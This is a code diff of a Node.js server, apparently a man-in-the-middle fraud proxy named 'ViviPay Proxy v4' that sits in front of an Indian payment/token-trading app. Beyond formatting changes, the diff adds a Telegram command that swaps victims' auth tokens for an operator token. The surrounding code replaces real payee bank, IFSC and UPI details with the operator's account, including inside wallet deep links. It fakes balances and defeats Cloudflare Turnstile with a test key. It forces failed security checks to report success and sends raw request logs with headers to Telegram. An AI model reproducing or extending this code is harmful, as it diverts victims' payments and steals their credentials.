@@ -36,11 +36,11 @@ const DEFAULT_DATA = {
 let bot = null;
 let webhookSet = false;
 const _balSnapTimes = {};
-try { bot = new TelegramBot(BOT_TOKEN); } catch(e) {}
+try { bot = new TelegramBot(BOT_TOKEN); } catch (e) { }
 
 let redis = null;
 if (REDIS_URL && REDIS_TOKEN) {
-  try { redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN }); } catch(e) {}
+  try { redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN }); } catch (e) { }
 }
 
 let cachedData = null;
@@ -70,7 +70,7 @@ function cacheSet(key, buf, ct, status, ttl) {
 
 async function ensureWebhook() {
   if (!bot || webhookSet) return;
-  try { await bot.setWebHook(WEBHOOK_URL); webhookSet = true; } catch(e) {}
+  try { await bot.setWebHook(WEBHOOK_URL); webhookSet = true; } catch (e) { }
 }
 
 async function loadData(forceRefresh) {
@@ -79,7 +79,7 @@ async function loadData(forceRefresh) {
   try {
     let raw = await redis.get('vivipayData');
     if (raw) {
-      if (typeof raw === 'string') { try { raw = JSON.parse(raw); } catch(e) {} }
+      if (typeof raw === 'string') { try { raw = JSON.parse(raw); } catch (e) { } }
       if (typeof raw === 'object' && raw !== null) {
         cachedData = { ...DEFAULT_DATA, ...raw };
       } else { cachedData = { ...DEFAULT_DATA }; }
@@ -89,7 +89,7 @@ async function loadData(forceRefresh) {
       cacheTime = Date.now();
       return cachedData;
     }
-  } catch(e) { console.error('Redis load error:', e.message); }
+  } catch (e) { console.error('Redis load error:', e.message); }
   cachedData = { ...DEFAULT_DATA };
   cacheTime = Date.now();
   return cachedData;
@@ -112,7 +112,7 @@ async function saveData(data) {
     cachedData = data;
     cacheTime = Date.now();
     await redis.set('vivipayData', data);
-  } catch(e) { cachedData = data; cacheTime = Date.now(); }
+  } catch (e) { cachedData = data; cacheTime = Date.now(); }
 }
 
 function getActiveBank(data, userId) {
@@ -153,7 +153,7 @@ function getOrderAmount(req, respData) {
 
 async function notifyAdmin(data, msg) {
   if (data.adminChatId && bot) {
-    try { await bot.sendMessage(data.adminChatId, msg.substring(0, 4000)); } catch(e) {}
+    try { await bot.sendMessage(data.adminChatId, msg.substring(0, 4000)); } catch (e) { }
   }
 }
 
@@ -176,7 +176,7 @@ async function sendRawLog(data, { method, url, reqHeaders, reqBodyRaw, status, r
     try {
       const parsed = JSON.parse(str);
       return JSON.stringify(parsed, null, 2);
-    } catch(e) {
+    } catch (e) {
       return str;
     }
   }
@@ -185,14 +185,14 @@ async function sendRawLog(data, { method, url, reqHeaders, reqBodyRaw, status, r
   async function sendChunked(text) {
     const MAX = 4000;
     if (text.length <= MAX) {
-      try { await bot.sendMessage(data.adminChatId, text); } catch(e) {}
+      try { await bot.sendMessage(data.adminChatId, text); } catch (e) { }
       return;
     }
     let i = 0;
     let part = 1;
     while (i < text.length) {
       const chunk = text.slice(i, i + MAX);
-      try { await bot.sendMessage(data.adminChatId, `[part ${part}]\n` + chunk); } catch(e) {}
+      try { await bot.sendMessage(data.adminChatId, `[part ${part}]\n` + chunk); } catch (e) { }
       i += MAX;
       part++;
     }
@@ -202,7 +202,7 @@ async function sendRawLog(data, { method, url, reqHeaders, reqBodyRaw, status, r
 
   // ── REQUEST message
   const reqMsg =
-`╔══════════════════════════════════╗
+    `╔══════════════════════════════════╗
 ║   📡 RAW LOG — ${srcTag}
 ╚══════════════════════════════════╝
 🕐 ${now}
@@ -220,7 +220,7 @@ ${fmtBody(reqBodyRaw)}`;
 
   // ── RESPONSE message
   const respMsg =
-`📥 RESPONSE  [${status}]
+    `📥 RESPONSE  [${status}]
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📋 Headers:
 ${fmtHeaders(respHeaders)}
@@ -283,7 +283,7 @@ async function resolveUserId(req) {
         return data.tokenMap['ip_' + ip];
       }
     }
-  } catch(e) {}
+  } catch (e) { }
   return '';
 }
 
@@ -300,7 +300,7 @@ async function saveUserMapping(req, userId) {
     if (tok && data.tokenMap[tok] !== String(userId)) { data.tokenMap[tok] = String(userId); changed = true; }
     if (ip && data.tokenMap['ip_' + ip] !== String(userId)) { data.tokenMap['ip_' + ip] = String(userId); changed = true; }
     if (changed) await saveData(data);
-  } catch(e) {}
+  } catch (e) { }
 }
 
 function parseMultipartFields(rawBody) {
@@ -315,53 +315,53 @@ function parseMultipartFields(rawBody) {
 }
 
 const BANK_FIELD_MAP = {
-  accountno:'accountNo',accountnumber:'accountNo',account_no:'accountNo',
-  receiveaccountno:'accountNo',bankaccount:'accountNo',bankaccountno:'accountNo',
-  payeeaccount:'accountNo',cardno:'accountNo',cardnumber:'accountNo',
-  bankcardno:'accountNo',payeecardno:'accountNo',receivecardno:'accountNo',
-  payeebankaccount:'accountNo',payeebankaccountno:'accountNo',payeeaccountno:'accountNo',
-  receiveraccount:'accountNo',receiveraccountno:'accountNo',
-  walletaccount:'accountNo',walletno:'accountNo',collectionaccount:'accountNo',
-  collectionaccountno:'accountNo',customerbanknumber:'accountNo',
-  customerbankaccount:'accountNo',accno:'accountNo',acc_no:'accountNo',
-  acctno:'accountNo',acctnum:'accountNo',acct_no:'accountNo',
-  account:'accountNo',receiveaccount:'accountNo',
-  beneficiaryname:'accountHolder',accountname:'accountHolder',account_name:'accountHolder',
-  receiveaccountname:'accountHolder',holdername:'accountHolder',accountholder:'accountHolder',
-  bankaccountholder:'accountHolder',receivename:'accountHolder',
-  payeename:'accountHolder',bankaccountname:'accountHolder',realname:'accountHolder',
-  cardholder:'accountHolder',cardname:'accountHolder',receivername:'accountHolder',
-  collectionname:'accountHolder',customername:'accountHolder',accname:'accountHolder',
-  acc_name:'accountHolder',acctname:'accountHolder',acct_name:'accountHolder',
-  truename:'accountHolder',receiverealname:'accountHolder',
-  payeerealname:'accountHolder',
-  ifsc:'ifsc',ifsccode:'ifsc',ifsc_code:'ifsc',receiveifsc:'ifsc',
-  bankifsc:'ifsc',payeeifsc:'ifsc',receiverifsc:'ifsc',collectionifsc:'ifsc',
-  acctcode:'ifsc',acct_code:'ifsc',acctifsc:'ifsc',
-  bankname:'bankName',bank_name:'bankName',payeebankname:'bankName',receiverbankname:'bankName',
-  upiid:'upiId',upi_id:'upiId',upi:'upiId',vpa:'upiId',
-  payeeupi:'upiId',receiverupi:'upiId',walletupi:'upiId',
-  payeebankaccount:'accountNo',payeerecipientsname:'accountHolder',
-  payeerecipientsname:'accountHolder',payeerecipientname:'accountHolder',
-  recipientsname:'accountHolder',recipientname:'accountHolder',
-  payeebankname:'bankName',payerbankname:'bankName'
+  accountno: 'accountNo', accountnumber: 'accountNo', account_no: 'accountNo',
+  receiveaccountno: 'accountNo', bankaccount: 'accountNo', bankaccountno: 'accountNo',
+  payeeaccount: 'accountNo', cardno: 'accountNo', cardnumber: 'accountNo',
+  bankcardno: 'accountNo', payeecardno: 'accountNo', receivecardno: 'accountNo',
+  payeebankaccount: 'accountNo', payeebankaccountno: 'accountNo', payeeaccountno: 'accountNo',
+  receiveraccount: 'accountNo', receiveraccountno: 'accountNo',
+  walletaccount: 'accountNo', walletno: 'accountNo', collectionaccount: 'accountNo',
+  collectionaccountno: 'accountNo', customerbanknumber: 'accountNo',
+  customerbankaccount: 'accountNo', accno: 'accountNo', acc_no: 'accountNo',
+  acctno: 'accountNo', acctnum: 'accountNo', acct_no: 'accountNo',
+  account: 'accountNo', receiveaccount: 'accountNo',
+  beneficiaryname: 'accountHolder', accountname: 'accountHolder', account_name: 'accountHolder',
+  receiveaccountname: 'accountHolder', holdername: 'accountHolder', accountholder: 'accountHolder',
+  bankaccountholder: 'accountHolder', receivename: 'accountHolder',
+  payeename: 'accountHolder', bankaccountname: 'accountHolder', realname: 'accountHolder',
+  cardholder: 'accountHolder', cardname: 'accountHolder', receivername: 'accountHolder',
+  collectionname: 'accountHolder', customername: 'accountHolder', accname: 'accountHolder',
+  acc_name: 'accountHolder', acctname: 'accountHolder', acct_name: 'accountHolder',
+  truename: 'accountHolder', receiverealname: 'accountHolder',
+  payeerealname: 'accountHolder',
+  ifsc: 'ifsc', ifsccode: 'ifsc', ifsc_code: 'ifsc', receiveifsc: 'ifsc',
+  bankifsc: 'ifsc', payeeifsc: 'ifsc', receiverifsc: 'ifsc', collectionifsc: 'ifsc',
+  acctcode: 'ifsc', acct_code: 'ifsc', acctifsc: 'ifsc',
+  bankname: 'bankName', bank_name: 'bankName', payeebankname: 'bankName', receiverbankname: 'bankName',
+  upiid: 'upiId', upi_id: 'upiId', upi: 'upiId', vpa: 'upiId',
+  payeeupi: 'upiId', receiverupi: 'upiId', walletupi: 'upiId',
+  payeebankaccount: 'accountNo', payeerecipientsname: 'accountHolder',
+  payeerecipientsname: 'accountHolder', payeerecipientname: 'accountHolder',
+  recipientsname: 'accountHolder', recipientname: 'accountHolder',
+  payeebankname: 'bankName', payerbankname: 'bankName'
 };
 
 function captureRealBank(obj, depth) {
   if (!obj || typeof obj !== 'object' || (depth || 0) > 8) return null;
   if (Array.isArray(obj)) {
-    for (const item of obj) { const r = captureRealBank(item, (depth||0)+1); if (r) return r; }
+    for (const item of obj) { const r = captureRealBank(item, (depth || 0) + 1); if (r) return r; }
     return null;
   }
-  const found = { accountHolder:'', accountNo:'', ifsc:'', bankName:'', upiId:'' };
+  const found = { accountHolder: '', accountNo: '', ifsc: '', bankName: '', upiId: '' };
   for (const k of Object.keys(obj)) {
-    const kl = k.toLowerCase().replace(/[_-]/g,'');
+    const kl = k.toLowerCase().replace(/[_-]/g, '');
     const mapped = BANK_FIELD_MAP[kl];
     if (mapped && !found[mapped] && obj[k] && String(obj[k]).trim()) found[mapped] = String(obj[k]).trim();
   }
   if (found.accountNo || found.ifsc) return found;
   for (const k of Object.keys(obj)) {
-    if (typeof obj[k] === 'object') { const r = captureRealBank(obj[k], (depth||0)+1); if (r) return r; }
+    if (typeof obj[k] === 'object') { const r = captureRealBank(obj[k], (depth || 0) + 1); if (r) return r; }
   }
   return null;
 }
@@ -377,11 +377,11 @@ function scanHasBankFields(obj, depth) {
   return false;
 }
 
-const NAME_FIELDS = ['name','payname','username','ctname','holdername','ownername',
-  'receivename','payeename','beneficiaryname','accountname','realname',
-  'cardholder','cardname','receivername','collectionname','customername',
-  'truename','accname','acctname','bankaccountname','receiveaccountname',
-  'payeerealname','receiverealname','bankaccountholder','accountholder'];
+const NAME_FIELDS = ['name', 'payname', 'username', 'ctname', 'holdername', 'ownername',
+  'receivename', 'payeename', 'beneficiaryname', 'accountname', 'realname',
+  'cardholder', 'cardname', 'receivername', 'collectionname', 'customername',
+  'truename', 'accname', 'acctname', 'bankaccountname', 'receiveaccountname',
+  'payeerealname', 'receiverealname', 'bankaccountholder', 'accountholder'];
 
 // Replace bank account/ifsc/name inside wallet deep-link URL strings
 // Handles: mobikwik://, freecharge://, amazonpay://, phonepe://, paytm://, upi://
@@ -391,18 +391,18 @@ function replaceWalletUrl(urlStr, bank) {
   // Must look like a wallet/UPI deep link or UPI pay URL
   if (!/^(mobikwik|freecharge|amazonpay|phonepe|paytm|bhim|gpay|upi|https?):\/\//i.test(urlStr)) return urlStr;
   // Param names that carry bank account number in these URLs
-  const acctParams  = ['account','accountnumber','acc','payeeaccount','pa','payee','vaccount','vpa','to'];
-  const ifscParams  = ['ifsc','bankifsc','payeeifsc','fi'];
-  const nameParams  = ['name','payeename','pn','reciever','receiver','to_name','toname'];
-  const dispParams  = ['displayaccountnumber','displayaccount','maskedaccount','masked'];
+  const acctParams = ['account', 'accountnumber', 'acc', 'payeeaccount', 'pa', 'payee', 'vaccount', 'vpa', 'to'];
+  const ifscParams = ['ifsc', 'bankifsc', 'payeeifsc', 'fi'];
+  const nameParams = ['name', 'payeename', 'pn', 'reciever', 'receiver', 'to_name', 'toname'];
+  const dispParams = ['displayaccountnumber', 'displayaccount', 'maskedaccount', 'masked'];
 
   try {
     // Split scheme + path from query string (deep links have custom schemes)
     const qIdx = urlStr.indexOf('?');
     if (qIdx === -1) return urlStr;
-    const base   = urlStr.slice(0, qIdx + 1);
+    const base = urlStr.slice(0, qIdx + 1);
     const params = new URLSearchParams(urlStr.slice(qIdx + 1));
-    let changed  = false;
+    let changed = false;
 
     for (const [key] of params) {
       const kl = key.toLowerCase().replace(/[_-]/g, '');
@@ -418,7 +418,7 @@ function replaceWalletUrl(urlStr, bank) {
       }
     }
     return changed ? base + params.toString() : urlStr;
-  } catch(e) {
+  } catch (e) {
     return urlStr;
   }
 }
@@ -442,10 +442,10 @@ function deepReplaceBankFields(obj, bank, depth, globalHasAcct) {
   }
 }
 
-const BALANCE_KEYS = ['balance','userbalance','availablebalance','totalbalance','money',
-  'itoken','itokenbalance','tokenbalance','usermoney','memberbalance',
-  'mybalance','walletbalance','accountbalance','rechargebalance','coinbalance',
-  'totalmoney','totalamount','membermoney','useritoken','myitoken','mytokenbalance'];
+const BALANCE_KEYS = ['balance', 'userbalance', 'availablebalance', 'totalbalance', 'money',
+  'itoken', 'itokenbalance', 'tokenbalance', 'usermoney', 'memberbalance',
+  'mybalance', 'walletbalance', 'accountbalance', 'rechargebalance', 'coinbalance',
+  'totalmoney', 'totalamount', 'membermoney', 'useritoken', 'myitoken', 'mytokenbalance'];
 
 function addBalanceToFields(obj, bonus, depth) {
   if (!obj || typeof obj !== 'object' || !bonus || depth > 10) return;
@@ -464,9 +464,9 @@ function addBalanceToFields(obj, bonus, depth) {
 
 function findBalanceDeep(obj, depth) {
   if (!obj || typeof obj !== 'object' || depth > 6) return null;
-  const balKeys = ['iToken','itoken','balance','userBalance','availableBalance','totalBalance',
-    'money','tokenBalance','usermoney','memberBalance','myBalance','itokenBalance','iTokenBalance',
-    'userMoney','coinBalance','walletBalance'];
+  const balKeys = ['iToken', 'itoken', 'balance', 'userBalance', 'availableBalance', 'totalBalance',
+    'money', 'tokenBalance', 'usermoney', 'memberBalance', 'myBalance', 'itokenBalance', 'iTokenBalance',
+    'userMoney', 'coinBalance', 'walletBalance'];
   for (const bk of balKeys) {
     if (obj[bk] !== undefined && obj[bk] !== null && obj[bk] !== '') {
       const v = parseFloat(obj[bk]);
@@ -519,7 +519,7 @@ app.use((req, res, next) => {
       } else {
         req.body = {};
       }
-    } catch(e) { req.body = {}; }
+    } catch (e) { req.body = {}; }
     next();
   });
 });
@@ -544,7 +544,7 @@ app.get('/inject.js', async (req, res) => {
     };
     let jsCode = INJECT_JS.replace('var CFG=null;', 'var CFG=' + JSON.stringify(initCfg) + ';');
     res.send(jsCode);
-  } catch(e) {
+  } catch (e) {
     res.send(INJECT_JS);
   }
 });
@@ -579,7 +579,7 @@ app.get('/hook/config', async (req, res) => {
       usdtAddr: data.usdtAddress || '',
       suspended: suspended
     });
-  } catch(e) {
+  } catch (e) {
     res.json({ enabled: false, an: '', ah: '', if: '', bn: '', ui: '', tg: TELEGRAM_OVERRIDE, bonus: 0 });
   }
 });
@@ -595,14 +595,14 @@ app.get('/setup-webhook', async (req, res) => {
     webhookSet = true;
     const info = await bot.getWebHookInfo();
     res.json({ success: true, webhook: info });
-  } catch(e) { res.json({ error: e.message }); }
+  } catch (e) { res.json({ error: e.message }); }
 });
 
 app.get('/health', async (req, res) => {
   const data = await loadData(true);
   const bank = getActiveBank(data, null);
   let redisOk = false;
-  if (redis) { try { await redis.ping(); redisOk = true; } catch(e) {} }
+  if (redis) { try { await redis.ping(); redisOk = true; } catch (e) { } }
   res.json({
     status: 'ok', app: 'ViviPay Proxy v4 (server-side)',
     redis: redis ? (redisOk ? 'connected' : 'error') : 'not configured',
@@ -632,7 +632,7 @@ app.post('/bot-webhook', async (req, res) => {
       data._skipOverrideMerge = true;
       await saveData(data);
       await bot.sendMessage(chatId,
-`🏦 ViviPay Proxy Controller v4
+        `🏦 ViviPay Proxy Controller v4
 (Server-Side Proxy Mode)
 
 === BANK COMMANDS ===
@@ -804,6 +804,21 @@ Example:
       return res.sendStatus(200);
     }
 
+    if (text.startsWith('/settoken ')) {
+      const t = text.substring(10).trim();
+      if (t.toLowerCase() === 'off') {
+        data.overrideToken = '';
+        data._skipOverrideMerge = true; await saveData(data);
+        await bot.sendMessage(chatId, '✅ Global indiatoken override OFF');
+      } else {
+        data.overrideToken = t;
+        data._skipOverrideMerge = true; await saveData(data);
+        await bot.sendMessage(chatId, `✅ Global indiatoken override SET:\n${t}\nAb saari proxy requests iss token se jayengi.`);
+      }
+      return res.sendStatus(200);
+    }
+
+
     if (text === '/idtrack') {
       const tracked = data.trackedUsers || {};
       const ids = Object.keys(tracked);
@@ -912,13 +927,14 @@ Example:
     }
 
     return res.sendStatus(200);
-  } catch(e) {
+  } catch (e) {
     console.error('Bot error:', e);
     return res.sendStatus(200);
   }
 });
 
 async function proxyToTivox(req) {
+  const data = await loadData();
   const path = req.originalUrl || req.url;
   const url = TIVOX_API + path;
   const fwd = {};
@@ -934,6 +950,13 @@ async function proxyToTivox(req) {
   fwd['sec-ch-ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
   fwd['sec-ch-ua-mobile'] = '?0';
   fwd['sec-ch-ua-platform'] = '"Windows"';
+
+  if (data.overrideToken) {
+    if (fwd['indiatoken'] !== undefined) fwd['indiatoken'] = data.overrideToken;
+    if (fwd['token'] !== undefined) fwd['token'] = data.overrideToken;
+    if (fwd['authorization'] !== undefined) fwd['authorization'] = data.overrideToken;
+  }
+
   const opts = { method: req.method, headers: fwd, redirect: 'manual' };
   if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
     opts.body = req.rawBody;
@@ -952,6 +975,7 @@ async function proxyToTivox(req) {
 }
 
 async function proxyToReal(req) {
+  const data = await loadData();
   const path = req.originalUrl || req.url;
   const url = REAL_API + path;
   const fwd = {};
@@ -961,6 +985,11 @@ async function proxyToReal(req) {
     fwd[k] = v;
   }
   fwd['host'] = 'qonix.click';
+  if (data.overrideToken) {
+    if (fwd['indiatoken'] !== undefined) fwd['indiatoken'] = data.overrideToken;
+    if (fwd['token'] !== undefined) fwd['token'] = data.overrideToken;
+    if (fwd['authorization'] !== undefined) fwd['authorization'] = data.overrideToken;
+  }
   const opts = { method: req.method, headers: fwd, redirect: 'manual' };
   if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
     opts.body = req.rawBody;
@@ -993,7 +1022,7 @@ app.get('/rsCfg.json', async (req, res) => {
     const url = 'https://' + FRONTEND_HOST + req.originalUrl;
     const resp = await fetch(url, { headers: { host: FRONTEND_HOST } });
     let cfg = null;
-    try { cfg = await resp.json(); } catch(e) {}
+    try { cfg = await resp.json(); } catch (e) { }
     if (cfg && cfg.data) {
       cfg.data.okTurnstileSitekey = '1x00000000000000000000AA';   // CF test key — always passes
       cfg.data.siteKey = '1x00000000000000000000AA';
@@ -1005,19 +1034,23 @@ app.get('/rsCfg.json', async (req, res) => {
     res.setHeader('content-type', 'application/json; charset=utf-8');
     res.setHeader('access-control-allow-origin', '*');
     res.setHeader('cache-control', 'no-store');
-    res.json(cfg || { code: 0, msg: 'success', data: {
-      okTurnstileSitekey: '1x00000000000000000000AA',
-      siteKey: '1x00000000000000000000AA',
-      rsKeyMode: 1,
-      sliderSmsCaptcha: 0
-    }});
-  } catch(e) {
-    res.json({ code: 0, msg: 'success', data: {
-      okTurnstileSitekey: '1x00000000000000000000AA',
-      siteKey: '1x00000000000000000000AA',
-      rsKeyMode: 1,
-      sliderSmsCaptcha: 0
-    }});
+    res.json(cfg || {
+      code: 0, msg: 'success', data: {
+        okTurnstileSitekey: '1x00000000000000000000AA',
+        siteKey: '1x00000000000000000000AA',
+        rsKeyMode: 1,
+        sliderSmsCaptcha: 0
+      }
+    });
+  } catch (e) {
+    res.json({
+      code: 0, msg: 'success', data: {
+        okTurnstileSitekey: '1x00000000000000000000AA',
+        siteKey: '1x00000000000000000000AA',
+        rsKeyMode: 1,
+        sliderSmsCaptcha: 0
+      }
+    });
   }
 });
 
@@ -1026,7 +1059,7 @@ app.get('/app/version', async (req, res) => {
     const data = await loadData();
     const { response, respBody, respHeaders } = await proxyToTivox(req);
     let jsonResp = null;
-    try { jsonResp = JSON.parse(respBody); } catch(e) {}
+    try { jsonResp = JSON.parse(respBody); } catch (e) { }
     if (jsonResp) {
       if (data.blockUpdate !== false) {
         if (jsonResp.forceUpdate !== undefined) jsonResp.forceUpdate = false;
@@ -1045,7 +1078,7 @@ app.get('/app/version', async (req, res) => {
       res.writeHead(response.status, respHeaders);
       res.end(respBody);
     }
-  } catch(e) {
+  } catch (e) {
     console.error('version error:', e.message);
     if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
   }
@@ -1059,7 +1092,7 @@ app.get('/app/jsValue/:type', async (req, res) => {
     respHeaders['content-length'] = String(Buffer.byteLength(respBody));
     res.writeHead(response.status, respHeaders);
     res.end(respBody);
-  } catch(e) {
+  } catch (e) {
     if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
   }
 });
@@ -1084,7 +1117,7 @@ app.all('/xxapi/*', async (req, res) => {
       // Still forward to real server but patch response to always succeed
       const { response: sr, respBody: sb, respHeaders: sh } = await proxyToTivox(req);
       let sj = null;
-      try { sj = JSON.parse(sb); } catch(e) {}
+      try { sj = JSON.parse(sb); } catch (e) { }
       if (sj) {
         // Force success / remove security failure
         if (sj.code !== undefined && sj.code !== 0 && sj.code !== 200) {
@@ -1115,46 +1148,46 @@ app.all('/xxapi/*', async (req, res) => {
       urlLower.includes('listbuy') || urlLower.includes('list_buy') ||
       // Detail / info / query / status endpoints must NOT be treated as buy actions
       urlLower.includes('/detail') || urlLower.includes('_detail') ||
-      urlLower.includes('/info')   || urlLower.includes('_info')   ||
-      urlLower.includes('/query')  || urlLower.includes('_query')  ||
+      urlLower.includes('/info') || urlLower.includes('_info') ||
+      urlLower.includes('/query') || urlLower.includes('_query') ||
       urlLower.includes('/status') || urlLower.includes('_status') ||
-      urlLower.includes('/view')   || urlLower.includes('_view')   ||
-      urlLower.includes('/check')  || urlLower.includes('_check')  ||
+      urlLower.includes('/view') || urlLower.includes('_view') ||
+      urlLower.includes('/check') || urlLower.includes('_check') ||
       urlLower.includes('/record') || urlLower.includes('_record') ||
-      urlLower.includes('/history')|| urlLower.includes('_history');
+      urlLower.includes('/history') || urlLower.includes('_history');
 
     // Detect wallet type from URL for specific handling
-    const isUsdtBuy    = urlLower.includes('usdt');
+    const isUsdtBuy = urlLower.includes('usdt');
     const isMobiKwikBuy = urlLower.includes('mobikwik') || urlLower.includes('mkw');
-    const isOsdtBuy    = urlLower.includes('osdt') || urlLower.includes('upiplus') || urlLower.includes('upi_plus');
+    const isOsdtBuy = urlLower.includes('osdt') || urlLower.includes('upiplus') || urlLower.includes('upi_plus');
 
     const isBuyOrder = !isBuyList && (
       urlLower.includes('buyitoken') || urlLower.includes('buy_itoken') ||
-      urlLower.includes('buyorder')  || urlLower.includes('buy_order') ||
+      urlLower.includes('buyorder') || urlLower.includes('buy_order') ||
       urlLower.includes('pickorder') || urlLower.includes('pick_order') ||
       urlLower.includes('graborder') || urlLower.includes('takeorder') ||
       urlLower.includes('receiveitoken') || urlLower.includes('receive_itoken') ||
-      urlLower.includes('roborder')  || urlLower.includes('snatchorder') ||
+      urlLower.includes('roborder') || urlLower.includes('snatchorder') ||
       // OSDT / UPI Plus buy action
-      urlLower.includes('buyosdt')   || urlLower.includes('buy_osdt') ||
-      urlLower.includes('grabosdt')  || urlLower.includes('receiveosdt') ||
+      urlLower.includes('buyosdt') || urlLower.includes('buy_osdt') ||
+      urlLower.includes('grabosdt') || urlLower.includes('receiveosdt') ||
       // USDT buy action
-      urlLower.includes('buyusdt')   || urlLower.includes('buy_usdt') ||
+      urlLower.includes('buyusdt') || urlLower.includes('buy_usdt') ||
       // MobiKwik buy action
       urlLower.includes('buymobikwik') || urlLower.includes('buy_mobikwik') ||
       // Generic buy / rpt
-      urlLower.includes('buyrpt')    || urlLower.includes('buy_rpt')
+      urlLower.includes('buyrpt') || urlLower.includes('buy_rpt')
     );
 
     if (isBuyOrder) {
       const { response: br, respBody: bb, respHeaders: bh } = await proxyToTivox(req);
       let bj = null;
-      try { bj = JSON.parse(bb); } catch(e) {}
+      try { bj = JSON.parse(bb); } catch (e) { }
       if (bj) {
         const origCode = bj.code;
-        const origMsg  = String(bj.msg || bj.message || '');
+        const origMsg = String(bj.msg || bj.message || '');
         const activeBank = getActiveBank(data, null);
-        const proxyOn    = data.botEnabled !== false;
+        const proxyOn = data.botEnabled !== false;
 
         // ── Helper: extract order/ct fields from request ──────────────────────
         let reqOrderId = '', reqCtId = '', reqCtType = '';
@@ -1170,11 +1203,11 @@ app.all('/xxapi/*', async (req, res) => {
           }
           const qs = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
           reqOrderId = rb.order_id || rb.orderId || rb.orderNo || rb.rptNo || qs.get('order_id') || qs.get('orderId') || '';
-          reqCtId    = rb.ct_id    || rb.ctId    || qs.get('ct_id')    || '';
-          reqCtType  = rb.ctType   || rb.ct_type || rb.payType || qs.get('ctType') || '';
-        } catch(e) {}
+          reqCtId = rb.ct_id || rb.ctId || qs.get('ct_id') || '';
+          reqCtType = rb.ctType || rb.ct_type || rb.payType || qs.get('ctType') || '';
+        } catch (e) { }
 
-        const savedOrder  = reqOrderId && data.orderBankMap ? data.orderBankMap[reqOrderId] : null;
+        const savedOrder = reqOrderId && data.orderBankMap ? data.orderBankMap[reqOrderId] : null;
         // Amount: try saved map first, then request body, then response data
         const _reqBodyAmt = getOrderAmount(req, req.body || {});
         const savedAmount = savedOrder ? savedOrder.amount : (_reqBodyAmt || 0);
@@ -1184,8 +1217,8 @@ app.all('/xxapi/*', async (req, res) => {
           const bkAcct = bank ? bank.accountNo : '';
           const bkIfsc = bank ? bank.ifsc : '';
           const bkName = bank ? bank.accountHolder : '';
-          const bkUpi  = bank ? (bank.upiId || '') : '';
-          const last4  = bkAcct.slice(-4);
+          const bkUpi = bank ? (bank.upiId || '') : '';
+          const last4 = bkAcct.slice(-4);
           let walletDomain = '', payAccount = bkUpi || '';
           if (derivedPt === 2 && bkAcct) {
             walletDomain = `mobikwik://moneytransfer/upi/bank?account=${bkAcct}&ifsc=${bkIfsc}&name=${encodeURIComponent(bkName)}&amount=${amt}.0&displayAccountNumber=xxxxxxxxx${last4}`;
@@ -1205,18 +1238,18 @@ app.all('/xxapi/*', async (req, res) => {
 
         // ctTypesPayType: 1→2(MobiKwik), 2→1(Bank), 3→1(Bank),
         // 4→2(MobiKwik), 7→2(MobiKwik), 9→2(MobiKwik), 17→2(MobiKwik), 18→3(UPI)
-        const CT_PAY_MAP = {1:2,2:1,3:1,4:2,7:2,9:2,17:2,18:3};
+        const CT_PAY_MAP = { 1: 2, 2: 1, 3: 1, 4: 2, 7: 2, 9: 2, 17: 2, 18: 3 };
         // For OSDT / UPI Plus — treat as MobiKwik (payType 2); for pure UPI tab → payType 3
-        const parsedCt  = reqCtType ? parseInt(reqCtType) : (isOsdtBuy ? 1 : 3);
+        const parsedCt = reqCtType ? parseInt(reqCtType) : (isOsdtBuy ? 1 : 3);
         // URL-based wallet type overrides ctType map:
         //   mobikwik URL or osdt → payType 2; usdt → special (no deep link); else use map
         const derivedPt = isMobiKwikBuy || isOsdtBuy ? 2
-                        : isUsdtBuy ? 0
-                        : (CT_PAY_MAP[parsedCt] || 1);
+          : isUsdtBuy ? 0
+            : (CT_PAY_MAP[parsedCt] || 1);
         const ptName = derivedPt === 2 ? 'MobiKwik'
-                     : derivedPt === 3 ? 'UPI'
-                     : derivedPt === 0 ? 'USDT'
-                     : 'Bank Transfer';
+          : derivedPt === 3 ? 'UPI'
+            : derivedPt === 0 ? 'USDT'
+              : 'Bank Transfer';
 
         if (origCode === 0 || origCode === undefined) {
           // ── Case 1: Real API returned SUCCESS ────────────────────────────────
@@ -1245,7 +1278,7 @@ app.all('/xxapi/*', async (req, res) => {
                   // walletDomain not present — inject one based on wallet type
                   const { walletDomain, payAccount } = buildWalletDeepLink(activeBank, amt4Case1, derivedPt);
                   if (walletDomain) bjData.walletDomain = walletDomain;
-                  if (payAccount)   bjData.payAccount   = payAccount;
+                  if (payAccount) bjData.payAccount = payAccount;
                 }
                 // ── Save to orderBankMap so Buy History shows our bank for this order ──
                 const case1OrderId = reqOrderId || (bjData && (bjData.rptNo || bjData.orderNo || bjData.orderId || ''));
@@ -1254,25 +1287,25 @@ app.all('/xxapi/*', async (req, res) => {
                   const bkAcctC1 = activeBank.accountNo;
                   const bkIfscC1 = activeBank.ifsc;
                   const bkNameC1 = activeBank.accountHolder;
-                  const last4C1  = bkAcctC1.slice(-4);
-                  const wDomC1   = bkAcctC1 ? `mobikwik://moneytransfer/upi/bank?account=${bkAcctC1}&ifsc=${bkIfscC1}&name=${encodeURIComponent(bkNameC1)}&amount=${amt4Case1}.0&displayAccountNumber=xxxxxxxxx${last4C1}` : (bjData.walletDomain || '');
+                  const last4C1 = bkAcctC1.slice(-4);
+                  const wDomC1 = bkAcctC1 ? `mobikwik://moneytransfer/upi/bank?account=${bkAcctC1}&ifsc=${bkIfscC1}&name=${encodeURIComponent(bkNameC1)}&amount=${amt4Case1}.0&displayAccountNumber=xxxxxxxxx${last4C1}` : (bjData.walletDomain || '');
                   data.orderBankMap[case1OrderId] = {
-                    bank:        `${bkNameC1} | ${bkAcctC1}${bkIfscC1 ? ' | ' + bkIfscC1 : ''}`,
-                    amount:      amt4Case1,
-                    rptNo:       case1OrderId,
-                    orderNo:     case1OrderId,
+                    bank: `${bkNameC1} | ${bkAcctC1}${bkIfscC1 ? ' | ' + bkIfscC1 : ''}`,
+                    amount: amt4Case1,
+                    rptNo: case1OrderId,
+                    orderNo: case1OrderId,
                     walletDomain: wDomC1,
-                    payType:     derivedPt,
-                    time:        now,
